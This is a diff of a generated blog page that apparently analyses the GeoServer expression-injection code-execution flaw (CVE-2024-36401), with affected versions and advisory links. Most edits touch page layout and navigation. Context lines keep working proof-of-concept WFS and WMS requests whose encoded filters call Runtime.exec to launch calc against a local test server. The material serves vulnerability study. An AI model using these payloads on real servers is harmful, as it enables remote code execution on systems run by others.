@@ -5,7 +5,7 @@
 <head>
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
     <meta name="keywords" content="GeoServer表达式注入代码执行漏洞, yyjccc的博客">
-    <meta name="description" content="GeoServer表达式注入代码执行漏洞概述信息参考：https://avd.aliyun.com/detail?id=AVD-2024-36401披露时间： 2024.7.2分析时间：2024.7.5-7.7github源码：https:">
+    <meta name="description" content="GeoServer表达式注入代码执行漏洞概述信息参考：https://avd.aliyun.com/detail?id=AVD-2024-36401披露时间： 2024.7.2github源码：https://github.com/geos">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -59,8 +59,8 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 6.3.0">
-<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+<meta name="generator" content="Hexo 6.3.0"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 </head>
 
 
@@ -449,7 +449,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="GeoServer表达式注入代码执行漏洞"><a href="#GeoServer表达式注入代码执行漏洞" class="headerlink" title="GeoServer表达式注入代码执行漏洞"></a>GeoServer表达式注入代码执行漏洞</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><strong>信息参考</strong>：<a target="_blank" rel="noopener" href="https://avd.aliyun.com/detail?id=AVD-2024-36401">https://avd.aliyun.com/detail?id=AVD-2024-36401</a><br><strong>披露时间</strong>： 2024.7.2<br><strong>分析时间</strong>：2024.7.5-7.7<br><strong>github源码</strong>：<a target="_blank" rel="noopener" href="https://github.com/geoserver/geoserver">https://github.com/geoserver/geoserver</a><br><strong>github 修复 commit</strong> ：<a target="_blank" rel="noopener" href="https://github.com/spring-cloud/spring-cloud-dataflow/commit/2ac9bfa5c2f7cdcc86938ce036283a37008add31">Improved validateUploadRequest and applied after tmp directory was cr… · spring-cloud/spring-cloud-dataflow@2ac9bfa</a><br><strong>分析版本</strong>：2.25.0<br><strong>漏洞版本</strong>：<br>2.25.0 &lt;= GeoServer &lt; 2.25.2<br>2.24.0 &lt;= GeoServer &lt; 2.24.4<br>GeoServer &lt; 2.23.6</p>
+                <h1 id="GeoServer表达式注入代码执行漏洞"><a href="#GeoServer表达式注入代码执行漏洞" class="headerlink" title="GeoServer表达式注入代码执行漏洞"></a>GeoServer表达式注入代码执行漏洞</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><strong>信息参考</strong>：<a target="_blank" rel="noopener" href="https://avd.aliyun.com/detail?id=AVD-2024-36401">https://avd.aliyun.com/detail?id=AVD-2024-36401</a><br><strong>披露时间</strong>： 2024.7.2<br><strong>github源码</strong>：<a target="_blank" rel="noopener" href="https://github.com/geoserver/geoserver">https://github.com/geoserver/geoserver</a><br><strong>分析版本</strong>：2.25.0<br><strong>漏洞版本</strong>：<br>2.25.0 &lt;= GeoServer &lt; 2.25.2<br>2.24.0 &lt;= GeoServer &lt; 2.24.4<br>GeoServer &lt; 2.23.6</p>
 <p>阐述：GeoServer由于GeoTool组件使用了含有漏洞的commons-jxpath组件导致表达式注入漏洞<br>相关信息：<br>漏洞通告：<a target="_blank" rel="noopener" href="https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv">https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv</a><br>GeoTool组件通告：<a target="_blank" rel="noopener" href="https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w">https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w</a><br>Jxpath漏洞利用：<a target="_blank" rel="noopener" href="https://github.com/Warxim/CVE-2022-41852?tab=readme-ov-file#workaround-for-cve-2022-41852">https://github.com/Warxim/CVE-2022-41852?tab=readme-ov-file#workaround-for-cve-2022-41852</a></p>
 <p>前置知识：<br>JXPath表达式注入<br>可参考：<a target="_blank" rel="noopener" href="https://www.yuque.com/yyjccc/pk74ko/zzgiottebwxay9e7">https://www.yuque.com/yyjccc/pk74ko/zzgiottebwxay9e7</a></p>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载war包：<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/geoserver/files">https://sourceforge.net/projects/geoserver/files</a><br>手动部署到Tomcat中，然后开启tomcat远程调试</p>
@@ -784,6 +784,7 @@ GET:
 GET：
 /geoserver/wfs?request=GetFeature&amp;version=1.1.0&amp;typeName=topp:states&amp;formatName=GML2&amp;FILTER=%3Cogc:Filter%20xmlns:ogc=%22http://www.opengis.net/ogc%22%3E%3Cogc:PropertyIsGreaterThan%3E%3Cogc:Div%3E%3Cogc:PropertyName%3EMANUAL%3C/ogc:PropertyName%3E%3Cogc:PropertyName%3Eexec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29%3C/ogc:PropertyName%3E%3C/ogc:Div%3E%3Cogc:Literal%3E0.25%3C/ogc:Literal%3E%3C/ogc:PropertyIsGreaterThan%3E%3C/ogc:Filter%3E</code></pre>
 ## WMS getMap
+
 <pre class="language-none"><code class="language-none">GET /geoserver/wms?version=1.3.0&amp;bbox=24,-130,50,-66&amp;Format=image/png&amp;request=GetMap&amp;width=550&amp;height=250&amp;crs=EPSG:4326&amp;SLD_BODY=%3CStyledLayerDescriptor+version%3D%221.1.0%22%3E%3CUserLayer%3E%3CName%3Etopp%3Astates%3C%2FName%3E%3CUserStyle%3E%3CName%3EUserSelection%3C%2FName%3E%3CFeatureTypeStyle%3E%3CRule%3E%3CFilter%3E%3CPropertyIsEqualTo%3E%3CPropertyName%3Eexec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29%3C%2FPropertyName%3E%3CLiteral%3EIllinois%3C%2FLiteral%3E%3C%2FPropertyIsEqualTo%3E%3C%2FFilter%3E%3CPolygonSymbolizer%3E%3CFill%3E%3CSvgParameter+name%3D%22fill%22%3E%23FF0000%3C%2FSvgParameter%3E%3C%2FFill%3E%3C%2FPolygonSymbolizer%3E%3C%2FRule%3E%3CRule%3E%3CLineSymbolizer%3E%3CStroke%2F%3E%3C%2FLineSymbolizer%3E%3C%2FRule%3E%3C%2FFeatureTypeStyle%3E%3C%2FUserStyle%3E%3C%2FUserLayer%3E%3C%2FStyledLayerDescriptor%3E HTTP/1.1
 Host: 127.0.0.1:8085</code></pre>
 <pre class="language-none"><code class="language-none">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
@@ -881,9 +882,7 @@ Host: 127.0.0.1:8085</code></pre>
 
 
 &lt;/ogc:GetMap&gt;</code></pre>
-## Reference
-
-<ul>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
 <li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14991">https://xz.aliyun.com/t/14991</a></li>
 <li><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2024/07/03/year/2024/7/%E6%B5%85%E6%9E%90GeoServer-property-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2024-36401/">https://y4tacker.github.io/2024/07/03/year/2024/7/%E6%B5%85%E6%9E%90GeoServer-property-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2024-36401/</a></li>
 </ul>
@@ -983,18 +982,17 @@ Host: 127.0.0.1:8085</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2024/07/08/GeoServer%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+                <a href="/2024/07/12/springcloud-dataflow%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%EF%BC%88CVE-2024-22263%EF%BC%89/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="GeoServer表达式注入代码执行漏洞">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="springcloud dataflow任意文件写入（CVE-2024-22263）">
                         
-                        <span class="card-title">GeoServer表达式注入代码执行漏洞</span>
+                        <span class="card-title">springcloud dataflow任意文件写入（CVE-2024-22263）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1004,9 +1002,9 @@ Host: 127.0.0.1:8085</code></pre>
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2024-07-08
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2024-07-12
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1019,20 +1017,15 @@ Host: 127.0.0.1:8085</code></pre>
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/java%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">java安全</span>
+                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">web安全</span>
                     </a>
                     
-                    <a href="/tags/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">
-                        <span class="chip bg-color">表达式注入</span>
-                    </a>
-                    
-                    <a href="/tags/geoserver/">
-                        <span class="chip bg-color">geoserver</span>
+                    <a href="/tags/springcloud/">
+                        <span class="chip bg-color">springcloud</span>
                     </a>
                     
                 </div>
@@ -1589,9 +1582,9 @@ $(function () {
                                                                                                                                                             
                                                                                                                                                                 <script
                                                                                                                                                                     src="/libs/instantpage/instantpage.js"
-                                                                                                                                                                    type="module"></script>
+                                                                                                                                                                    type="module"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
                                                                                                                                                                 
 
-    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true,"react":{"opacity":0.7}}});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
+    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true,"react":{"opacity":0.7}}});</script></body>
 
 </html>
